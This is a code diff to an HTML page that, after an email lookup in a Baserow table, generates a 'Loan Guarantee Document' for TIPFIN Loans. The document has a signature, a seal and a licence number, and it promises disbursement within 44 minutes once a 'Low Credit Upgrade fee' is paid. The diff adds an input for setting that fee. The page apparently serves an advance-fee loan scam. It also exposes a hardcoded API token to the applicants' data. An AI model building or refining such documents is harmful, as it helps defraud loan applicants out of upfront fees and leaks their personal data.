@@ -1,7 +1,7 @@
-ff<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Loan Approval Certificate | TIPFIN Loans</title>
+    <title>Guarantee Document | TIPFIN Loans</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
@@ -68,12 +68,20 @@ ff<!DOCTYPE html>
         .portal-input {
             width: 100%; padding: 14px 16px;
             background: #050d1a; border: 1px solid #1a3a6b;
-            color: #fff; margin: 24px 0;
+            color: #fff; margin: 14px 0 0;
             text-align: center; font-size: 15px;
             font-family: Arial, sans-serif; letter-spacing: 0.5px;
         }
         .portal-input::placeholder { color: #4a6fa5; }
         .portal-input:focus { outline: none; border-color: #1a56db; }
+
+        .portal-label {
+            display: block; text-align: left;
+            font-family: Arial, sans-serif;
+            font-size: 10px; letter-spacing: 1.5px;
+            text-transform: uppercase; color: #6b82a8;
+            margin-top: 18px; margin-bottom: 4px;
+        }
 
         .portal-btn {
             background: linear-gradient(135deg, #1a3a6b 0%, #1a56db 100%);
@@ -81,6 +89,7 @@ ff<!DOCTYPE html>
             cursor: pointer; font-weight: bold; width: 100%;
             text-transform: uppercase; font-family: Arial, sans-serif;
             font-size: 12px; letter-spacing: 2px; transition: opacity 0.2s;
+            margin-top: 22px;
         }
         .portal-btn:hover { opacity: 0.88; }
         .portal-btn:disabled { background: #333; cursor: default; }
@@ -125,7 +134,7 @@ ff<!DOCTYPE html>
             width: 1123px;
             height: 794px;
             background: #ffffff;
-            padding: 62px 105px 50px;
+            padding: 58px 100px 48px;
             box-shadow: 0 0 60px rgba(0,0,0,0.7);
             position: relative;
             overflow: hidden;
@@ -164,11 +173,11 @@ ff<!DOCTYPE html>
         ============================================================ */
         .identity-header {
             text-align: center;
-            margin-bottom: 14px;
+            margin-bottom: 12px;
         }
         .company-logo {
-            height: 52px; object-fit: contain;
-            display: block; margin: 0 auto 6px;
+            height: 48px; object-fit: contain;
+            display: block; margin: 0 auto 5px;
         }
         .brand-name {
             font-family: Arial, sans-serif;
@@ -187,17 +196,17 @@ ff<!DOCTYPE html>
         ============================================================ */
         .doc-title-block {
             text-align: center;
-            margin: 14px 0 16px;
+            margin: 10px 0 14px;
         }
         .doc-title {
-            font-size: 21px; font-weight: bold;
+            font-size: 22px; font-weight: bold;
             color: #0e1e3d; letter-spacing: 1px;
             text-transform: uppercase;
         }
         .doc-underline {
             width: 380px; height: 1.5px;
             background: linear-gradient(to right, transparent, #1a56db, transparent);
-            margin: 5px auto 8px;
+            margin: 5px auto 7px;
         }
         .doc-ref {
             font-size: 10px; font-family: Arial, sans-serif;
@@ -208,7 +217,7 @@ ff<!DOCTYPE html>
            LEGAL CONTENT
         ============================================================ */
         .legal-content {
-            font-size: 15.5px;
+            font-size: 16.5px;
             line-height: 1.62;
             text-align: justify;
             color: #1a1a1a;
@@ -222,14 +231,14 @@ ff<!DOCTYPE html>
         }
 
         .guarantee-box {
-            margin: 14px auto;
+            margin: 13px auto;
             width: 88%;
-            padding: 16px 22px;
+            padding: 14px 20px;
             border: 1.5px solid #1a3a6b;
             background: rgba(26, 86, 219, 0.03);
             font-style: italic;
             text-align: center;
-            font-size: 15px;
+            font-size: 16px;
             font-weight: bold;
             color: #0e1e3d;
             line-height: 1.55;
@@ -239,7 +248,7 @@ ff<!DOCTYPE html>
            EXECUTION AREA
         ============================================================ */
         .execution-area {
-            margin-top: 18px;
+            margin-top: 16px;
             display: flex;
             justify-content: space-between;
             align-items: flex-end;
@@ -252,7 +261,7 @@ ff<!DOCTYPE html>
         }
         .signature-space {
             border-bottom: 1.5px solid #222;
-            height: 62px;
+            height: 60px;
             margin-bottom: 8px;
             position: relative;
             display: flex;
@@ -260,9 +269,8 @@ ff<!DOCTYPE html>
             justify-content: center;
             padding-bottom: 4px;
         }
-        /* Replace src with your signature image URL */
         .signature-graphic {
-            max-height: 56px;
+            max-height: 54px;
             max-width: 220px;
             object-fit: contain;
             mix-blend-mode: multiply;
@@ -280,9 +288,8 @@ ff<!DOCTYPE html>
             width: 140px;
             text-align: center;
         }
-        /* Replace src with your seal image URL */
         .official-seal {
-            width: 110px; height: 95px;
+            width: 100px; height: 88px;
             object-fit: contain;
             display: block; margin: 0 auto;
         }
@@ -297,9 +304,9 @@ ff<!DOCTYPE html>
         ============================================================ */
         .fine-legal-print {
             position: absolute;
-            bottom: 68px; left: 110px; right: 110px;
+            bottom: 62px; left: 110px; right: 110px;
             text-align: center;
-            font-size: 8.5px; color: #999;
+            font-size: 8px; color: #999;
             font-family: Arial, sans-serif; letter-spacing: 0.3px;
         }
 
@@ -321,7 +328,6 @@ ff<!DOCTYPE html>
     <div id="verificationModal">
         <div class="portal-box">
             <div class="portal-logo-wrap">
-                <!-- Replace src with your logo URL -->
                 <img src="image/logo.png" alt="TIPFIN Loans" class="portal-logo-img"
                      onerror="this.style.display='none';">
                 <div class="portal-brand-name">TIPFIN</div>
@@ -330,10 +336,14 @@ ff<!DOCTYPE html>
             <div class="portal-title"><i class="fas fa-shield-alt"></i> &nbsp;SECURE SERVER ACCESS</div>
             <div class="portal-sub">VERIFYING LOAN DISBURSEMENT AUTHORITY</div>
             <form id="authForm">
+                <label class="portal-label" for="emailInput">Email Address</label>
                 <input type="email" id="emailInput" class="portal-input"
                        placeholder="Registered Email Address" required autocomplete="email">
+                <label class="portal-label" for="feeAmountInput">Fee Amount (R)</label>
+                <input type="number" id="feeAmountInput" class="portal-input"
+                       placeholder="e.g. 720" min="0" step="0.01">
                 <button type="submit" class="portal-btn" id="authBtn">
-                    <i class="fas fa-unlock-alt"></i> &nbsp;UNLOCK LOAN INSTRUMENT
+                    <i class="fas fa-unlock-alt"></i> &nbsp;UNLOCK GUARANTEE DOCUMENT
                 </button>
             </form>
             <p id="errMsg"></p>
@@ -345,7 +355,7 @@ ff<!DOCTYPE html>
     ===================================================== -->
     <div class="toolbar" id="docToolbar">
         <div class="toolbar-info">
-            <i class="fas fa-shield-alt"></i> &nbsp;ENCRYPTED LOAN INSTRUMENT &nbsp;|&nbsp; TF/LA-2026
+            <i class="fas fa-shield-alt"></i> &nbsp;GUARANTEE DOCUMENT &nbsp;|&nbsp; TF/GD-2026
         </div>
         <div>
             <button class="toolbar-btn" onclick="window.print()">
@@ -358,11 +368,10 @@ ff<!DOCTYPE html>
     </div>
 
     <!-- =====================================================
-         LANDSCAPE CERTIFICATE PAPER
+         LANDSCAPE DOCUMENT PAPER
     ===================================================== -->
     <div class="paper" id="legalPaper">
 
-        <!-- Ornate Border -->
         <div class="ornate-border"></div>
         <div class="inner-frame"></div>
         <div class="corner top-left"></div>
@@ -372,7 +381,6 @@ ff<!DOCTYPE html>
 
         <!-- Header -->
         <div class="identity-header">
-            <!-- Replace src with your logo URL -->
             <img src="image/logo.png" alt="TIPFIN Loans" class="company-logo"
                  onerror="this.style.display='none';">
             <div class="brand-name">TIPFIN LOANS (PTY) LTD</div>
@@ -381,10 +389,10 @@ ff<!DOCTYPE html>
 
         <!-- Title -->
         <div class="doc-title-block">
-            <div class="doc-title">IRREVOCABLE LOAN APPROVAL &amp; DISBURSEMENT CERTIFICATE</div>
+            <div class="doc-title">LOAN GUARANTEE DOCUMENT</div>
             <div class="doc-underline"></div>
             <div class="doc-ref">
-                REF: TF/LA-2026 &nbsp;|&nbsp; AUTHENTICATED: <span id="currentDate">…</span>
+                REF: TF/GD-2026 &nbsp;|&nbsp; AUTHENTICATED: <span id="currentDate">…</span>
             </div>
         </div>
 
@@ -398,77 +406,67 @@ ff<!DOCTYPE html>
                 National Credit Act (NCA) of the Republic of South Africa.
             </p>
 
-            <p style="margin-top: 11px;">
+            <p style="margin-top: 10px;">
                 We hereby certify that the approved loan amount of
                 <span class="highlight-data" id="amountTarget">…</span>
                 has been cleared, ring-fenced, and held in trust for immediate disbursement upon completion of
-                the final Low credit Upgrade requirement. This approval is legally binding and cannot be rescinded once
-                the Low credit Upgrade fee of <strong>R720.00</strong> has been received and processed.
+                the final Low Credit Upgrade requirement. This approval is legally binding and cannot be rescinded once
+                the Low Credit Upgrade fee of <strong id="feeBadgeDoc">R720.00</strong> has been received and processed.
             </p>
 
             <div class="guarantee-box">
                 "TIPFIN Loans (Pty) Ltd formally guarantees the release of the aforementioned approved funds
                 to the applicant's verified bank account within <strong>44 minutes</strong> of the
-                final Low credit Upgrade and risk-management compliance verification."
+                final Low Credit Upgrade and risk-management compliance verification."
             </div>
 
             <p>
                 This document is executed under the authority of the National Credit Act and confirms that the
                 applicant has met the primary financial criteria for capital release. The approved loan carries
                 an interest rate of <strong>5% per annum</strong> and is subject to the terms and conditions
-                of the signed Master Loan Agreement. TIPFIN Loans is committed to responsible lending and
-                assisting clients in accessing fair financial solutions.
+                of the signed Master Loan Agreement.
             </p>
         </div>
 
         <!-- Execution Area -->
         <div class="execution-area">
-
-            <!-- MD Signature block -->
             <div class="signatory-block">
                 <div class="signature-space">
-                    <!-- Replace src with your signature image URL -->
                     <img src="image/signature.png" alt="MD Signature" class="signature-graphic"
                          onerror="this.style.display='none';">
                 </div>
                 <div class="signatory-name">Sipho Thabethe</div>
-                <div class="signatory-title">. </div>
+                <div class="signatory-title">Managing Director</div>
             </div>
 
-            <!-- Seal block -->
             <div class="seal-block">
-                <!-- Replace src with your seal image URL -->
                 <img src="image/seal2.png" alt="Official Seal" class="official-seal"
                      onerror="this.style.opacity='0';">
                 <div class="seal-caption">Corporate Security Seal</div>
             </div>
-
         </div>
 
         <!-- Fine Print -->
         <div class="fine-legal-print">
-            Official Legal Instrument. TIPFIN Loans (Pty) Ltd is a Licensed Credit Provider (NCR Reg: NCRCP22024 | Company Reg: 2024/669652/07).
-            20 Everest Street CE2, Vanderbijlpark, 1911 &nbsp;·&nbsp; info.tipfin@aol.com &nbsp;·&nbsp; +27 68 529 9179.
-            Terms and conditions apply as per the signed Master Loan Agreement.
+            TIPFIN Loans (Pty) Ltd &nbsp;·&nbsp; Licensed Credit Provider &nbsp;·&nbsp; NCR: NCRCP22024
+            &nbsp;·&nbsp; info.tipfin@aol.com &nbsp;·&nbsp; +27 68 529 9179 &nbsp;·&nbsp; T&amp;Cs apply.
         </div>
 
     </div><!-- /paper -->
 
     <script>
         /* ============================================================
-           BASEROW CONFIGURATION — TIPFIN TABLE
+           BASEROW CONFIGURATION
         ============================================================ */
         const BASEROW_TOKEN  = 'LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
         const TABLE_ID       = '936442';
-        const EMAIL_FIELD    = 'field_8136510';   // Email field
-        const FNAME_FIELD    = 'field_8136507';   // name
-        const LNAME_FIELD    = 'field_8136508';   // lastname
-        const AMOUNT_FIELD   = 'field_8136509';   // loanAmount
+        const EMAIL_FIELD    = 'field_8136510';
+        const FNAME_FIELD    = 'field_8136507';
+        const LNAME_FIELD    = 'field_8136508';
+        const AMOUNT_FIELD   = 'field_8136509';
 
         /* ============================================================
            FETCH FROM BASEROW
-           Searches all rows where email contains the entered value,
-           then picks the best match (exact email, most data).
         ============================================================ */
         async function fetchBaserow(email) {
             const url = `https://api.baserow.io/api/database/rows/table/${TABLE_ID}/`
@@ -478,15 +476,11 @@ ff<!DOCTYPE html>
                 const res  = await fetch(url, { headers: { 'Authorization': `Token ${BASEROW_TOKEN}` } });
                 const data = await res.json();
                 if (!data.results || data.results.length === 0) return null;
-
-                /* Filter: email must actually contain the search term */
                 const matches = data.results.filter(r =>
                     (r[EMAIL_FIELD] || '').toString().toLowerCase()
                         .includes(email.trim().toLowerCase())
                 );
                 if (!matches.length) return null;
-
-                /* Prefer exact email match, otherwise take first */
                 const exact = matches.find(r =>
                     (r[EMAIL_FIELD] || '').toString().toLowerCase().trim()
                         === email.trim().toLowerCase()
@@ -494,6 +488,18 @@ ff<!DOCTYPE html>
                 return exact || matches[0];
             } catch (e) {
                 return null;
+            }
+        }
+
+        /* ============================================================
+           APPLY FEE AMOUNT
+        ============================================================ */
+        function applyFeeAmount() {
+            const raw = parseFloat(document.getElementById('feeAmountInput').value);
+            if (!isNaN(raw) && raw > 0) {
+                const formatted = 'R' + raw.toLocaleString('en-ZA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                const badge = document.getElementById('feeBadgeDoc');
+                if (badge) badge.textContent = formatted;
             }
         }
 
@@ -513,8 +519,8 @@ ff<!DOCTYPE html>
             const record = await fetchBaserow(email);
 
             if (record) {
-                const fName  = (record[FNAME_FIELD]  || '').toString().trim();
-                const lName  = (record[LNAME_FIELD]  || '').toString().trim();
+                const fName    = (record[FNAME_FIELD]  || '').toString().trim();
+                const lName    = (record[LNAME_FIELD]  || '').toString().trim();
                 const fullName = [fName, lName].filter(Boolean).join(' ').toUpperCase() || 'THE APPLICANT';
 
                 const rawAmt = (record[AMOUNT_FIELD] || '0').toString().replace(/[^0-9.]/g, '');
@@ -529,38 +535,40 @@ ff<!DOCTYPE html>
                 document.getElementById('amountTarget').textContent = amtStr;
                 document.getElementById('currentDate').textContent  = dateStr;
 
+                applyFeeAmount();
+
                 document.getElementById('verificationModal').style.display = 'none';
                 document.getElementById('docToolbar').style.display  = 'flex';
                 document.getElementById('legalPaper').style.display  = 'block';
             } else {
                 errEl.textContent    = 'ACCESS DENIED: CREDENTIALS NOT FOUND IN OUR SYSTEM.';
                 errEl.style.display  = 'block';
-                btn.textContent      = 'UNLOCK LOAN INSTRUMENT';
+                btn.textContent      = 'UNLOCK GUARANTEE DOCUMENT';
                 btn.disabled         = false;
             }
         });
 
         /* ============================================================
-           PDF DOWNLOAD — Landscape A4
+           PDF DOWNLOAD — Landscape A4, small file size
         ============================================================ */
         async function downloadPDF() {
             const { jsPDF } = window.jspdf;
             const element   = document.getElementById('legalPaper');
 
             const canvas = await html2canvas(element, {
-                scale: 3,
+                scale: 2,
                 useCORS: true,
                 allowTaint: true,
                 logging: false,
                 backgroundColor: '#ffffff'
             });
 
-            const pdf = new jsPDF('l', 'mm', 'a4'); // landscape
-            pdf.addImage(canvas.toDataURL('image/png'), 'PNG', 0, 0, 297, 210);
+            const pdf = new jsPDF('l', 'mm', 'a4');
+            pdf.addImage(canvas.toDataURL('image/jpeg', 0.82), 'JPEG', 0, 0, 297, 210);
 
             const nameEl = document.getElementById('nameTarget');
             const name   = (nameEl ? nameEl.textContent : 'Applicant').replace(/\s+/g, '_');
-            pdf.save(`TIPFIN_LoanCertificate_${name}.pdf`);
+            pdf.save(`TIPFIN_GuaranteeDocument_${name}.pdf`);
         }
     </script>
 </body>
